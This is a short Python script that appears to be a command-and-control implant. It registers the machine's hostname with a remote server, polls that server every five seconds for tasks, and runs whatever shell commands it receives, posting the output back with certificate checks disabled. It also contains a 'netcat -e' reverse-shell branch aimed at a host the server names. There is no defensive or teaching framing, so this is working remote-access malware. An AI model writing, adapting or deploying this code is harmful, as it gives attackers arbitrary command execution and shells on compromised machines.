import requests as r
import time
import subprocess as sp
HOST = "192.168.178.107"
PORT = 10000
SERVICE = "https"
URL = f"{SERVICE}://{HOST}:{PORT}"
data = {
    "address": "192.168.178.107",
    "hostname": sp.getoutput("hostname")
}
name = r.post(f"{URL}/connect", json=data, verify=False).text

while True:
    time.sleep(5)
    tasks = r.get(URL + "/tasks/" + name, verify=False).json()
    print(tasks)
    for task in tasks:
        if task["type"] in ["rce"]:
            print(True)
            data = {
                "id": task["id"]
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"][0])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls" + task["args"][0])
            elif task["type"] == "reverse-shell":
                data = sp.getoutput(f"netcat -e {task['args'][2]} {task['args'][0]} {task['args'][1]}")
            res = r.post(URL + "/finish/" + name, json=data, verify=False)
            print(res.status_code)

            

        